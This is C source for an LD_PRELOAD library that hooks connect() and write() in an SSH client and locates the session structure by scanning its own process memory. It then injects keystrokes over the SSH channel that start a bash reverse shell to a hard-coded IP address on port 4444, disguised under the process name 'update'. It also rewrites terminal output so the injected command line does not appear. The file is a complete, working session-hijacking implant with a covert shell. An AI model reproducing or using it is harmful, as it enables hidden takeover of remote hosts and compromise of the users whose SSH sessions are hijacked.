// compile with: gcc -fPIC -shared -o inject_write.so inject_write.c packet.o sshbuf.o sshbuf-getput-basic.o cipher.o *chacha*.o poly1305.o -ldl -pthread

#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <pthread.h>
#include <stdint.h>
#include "packet.h"

#define SSH2_MSG_CHANNEL_DATA 94

// Renaming our struct to avoid conflict with the original
struct my_ssh {};

static int (*original_connect)(int sockfd, const struct sockaddr *addr, socklen_t addrlen) = NULL;
static ssize_t (*original_write)(int fd, const void *buf, size_t count) = NULL;
static int main_connection_found = 0;
static void *found_offset = NULL;

struct connection_info {
    uint16_t remote_port_hex;
    uint16_t local_port_hex;
    pid_t pid;
};

void scan_memory_for_pattern(pid_t pid, uint16_t remote_port_hex, uint16_t local_port_hex);
void inject_keystrokes(struct my_ssh *ssh, u_int channel_id);
void* memory_scan_thread(void *arg);

void* memory_scan_thread(void *arg) {
    struct connection_info *conn_info = (struct connection_info *)arg;

    // Add a delay to ensure the connection is fully established
    sleep(1);

    scan_memory_for_pattern(conn_info->pid, conn_info->remote_port_hex, conn_info->local_port_hex);

    free(conn_info);
    return NULL;
}

void scan_memory_for_pattern(pid_t pid, uint16_t remote_port_hex, uint16_t local_port_hex) {
    char maps_filename[64], mem_filename[64];
    snprintf(maps_filename, sizeof(maps_filename), "/proc/%d/maps", pid);
    snprintf(mem_filename, sizeof(mem_filename), "/proc/%d/mem", pid);

    FILE *maps_file = fopen(maps_filename, "r");
    if (maps_file == NULL) {
        perror("fopen maps_file");
        return;
    }

    FILE *mem_file = fopen(mem_filename, "rb");
    if (mem_file == NULL) {
        perror("fopen mem_file");
        fclose(maps_file);
        return;
    }

    char line[256];
    while (fgets(line, sizeof(line), maps_file)) {
        void *start, *end;
        char permissions[5];
        if (sscanf(line, "%p-%p %4s", &start, &end, permissions) != 3) {
            continue;
        }

        if (strchr(permissions, 'r') == NULL) {
            // Skip non-readable regions
            continue;
        }

        size_t size = (char *)end - (char *)start;

        uint8_t *buffer = malloc(size);
        if (buffer == NULL) {
            perror("malloc");
            continue;
        }
        if (fseek(mem_file, (off_t)start, SEEK_SET) != 0) {
            perror("fseek");
            free(buffer);
            continue;
        }

        size_t read_size = fread(buffer, 1, size, mem_file);
        if (read_size != size) {
            perror("fread");
            free(buffer);
            continue;
        }

        uint32_t known_value_at_0x18 = remote_port_hex;
        uint32_t known_value_at_0x28 = local_port_hex;

        for (size_t i = 0; i < size - 2168; i += 4) {
            uint32_t possible_match = *(uint32_t *)(buffer + i);

            if (possible_match == known_value_at_0x18) {
                size_t offset_0x28 = i + 0x28 - 0x18;
                uint32_t extracted_value = *(uint32_t *)(buffer + offset_0x28);

                if (extracted_value == known_value_at_0x28) {
                    void *struct_start = (void *)((uintptr_t)start + i - 0x18);
                    printf("Pattern found at offset: %p\n", struct_start);

                    struct my_ssh *ssh_struct = (struct my_ssh *)(buffer + i - 0x18);
                    inject_keystrokes(ssh_struct, 0); // Assume channel_id is 0

                    free(buffer);
                    fclose(mem_file);
                    fclose(maps_file);
                    return;
                }
            }
        }

        free(buffer);
    }

    fclose(mem_file);
    fclose(maps_file);

    printf("Pattern not found\n");
}

void inject_keystrokes(struct my_ssh *ssh, u_int channel_id) {
    int r;
    const char *keystrokes = "(exec -a 'update' /bin/bash -c 'exec 5<>/dev/tcp/145.100.103.29/4444; while read -r cmd <&5; do eval \"$cmd\" >&5 2>&5; done' & )  > /dev/null 2>&1\n";

    if ((r = sshpkt_start((struct ssh *)ssh, SSH2_MSG_CHANNEL_DATA)) != 0 ||
        (r = sshpkt_put_u32((struct ssh *)ssh, channel_id)) != 0 ||
        (r = sshpkt_put_string((struct ssh *)ssh, keystrokes, strlen(keystrokes))) != 0 ||
        (r = sshpkt_send((struct ssh *)ssh)) != 0) {
    }

    // Empty the buffer
    if ((r = ssh_packet_write_poll((struct ssh*)ssh)) != 0) {
    }
    sleep(1);
}

ssize_t write(int fd, const void *buf, size_t count) {
    if (!original_write) {
        original_write = dlsym(RTLD_NEXT, "write");
    }

    const char *filter_string = "(exec -a 'update' /bin/bash -c 'exec 5<>/dev/tcp/145.100.103.29/4444; while read -r cmd <&5; do eval \"$cmd\" >&5 2>&5; done' & )  > /dev/null 2>&1";
    const char *data = (const char *)buf;
    size_t remaining_count = count;

    // Check if the buffer contains the filter string
    const char *occurrence = strstr(data, filter_string);
    if (occurrence != NULL) {
        // Allocate a new buffer to store the modified data
        char *modified_buf = malloc(count);
        if (!modified_buf) {
            return original_write(fd, buf, count);
        }

        size_t offset = 0;
        while (occurrence != NULL) {
            // Find the start of the line
            const char *line_start = occurrence;
            while (line_start > data && *(line_start - 1) != '\n') {
                line_start--;
            }

            // Find the end of the line
            const char *line_end = strstr(line_start, "\n");
            size_t line_length;
            if (line_end) {
                line_length = line_end - line_start + 1; 
            } else {
                line_length = strlen(line_start);
            }

            // Copy data up to the start of the line containing the filter section
            size_t len_before_line = line_start - data;
            memcpy(modified_buf + offset, data, len_before_line);
            offset += len_before_line;

            // Replace the line containing the filter section with spaces
            memset(modified_buf + offset, ' ', line_length);
            offset += line_length;

            // Move the data pointer past the filtered line
            data = line_start + line_length;

            // Update remaining count and find the next occurrence
            remaining_count = count - (data - (const char *)buf);
            occurrence = strstr(data, filter_string);
        }

        // Copy the remaining data after the last occurrence
        memcpy(modified_buf + offset, data, remaining_count);
        ssize_t bytes_written = original_write(fd, modified_buf, offset + remaining_count);
        free(modified_buf);
        return bytes_written;
    }

    return original_write(fd, buf, count);
}

int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    if (!original_connect) {
        original_connect = dlsym(RTLD_NEXT, "connect");
    }

    int result = original_connect(sockfd, addr, addrlen);

    if (result == 0 && addr->sa_family == AF_INET) {
        struct sockaddr_in local_addr, remote_addr;
        socklen_t len = sizeof(local_addr);
        getsockname(sockfd, (struct sockaddr *)&local_addr, &len);
        getpeername(sockfd, (struct sockaddr *)&remote_addr, &len);

        // Little-endian 16-bit
        uint16_t remote_port_hex = htons(remote_addr.sin_port);  
        uint16_t local_port_hex = htons(local_addr.sin_port); 

        if (remote_port_hex != 0 && local_port_hex != 0) {
            if (!main_connection_found) {

                struct connection_info *conn_info = malloc(sizeof(struct connection_info));
                if (conn_info == NULL) {
                    perror("malloc");
                    return result;
                }

                conn_info->remote_port_hex = remote_port_hex;
                conn_info->local_port_hex = local_port_hex;
                conn_info->pid = getpid();

                pthread_t thread;
                if (pthread_create(&thread, NULL, memory_scan_thread, conn_info) != 0) {
                    perror("pthread_create");
                    free(conn_info);
                    return result;
                }

                pthread_detach(thread);
                main_connection_found = 1;
            }
        }
    }

    return result;
}

__attribute__((constructor))
void init() {
    original_connect = dlsym(RTLD_NEXT, "connect");
    if (!original_connect) {
        fprintf(stderr, "Error loading original connect function\n");
        exit(1);
    }
    original_write = dlsym(RTLD_NEXT, "write");
    if (!original_write) {
        fprintf(stderr, "Error loading original write function\n");
        exit(1);
    }
}

__attribute__((destructor))
void cleanup() {
}
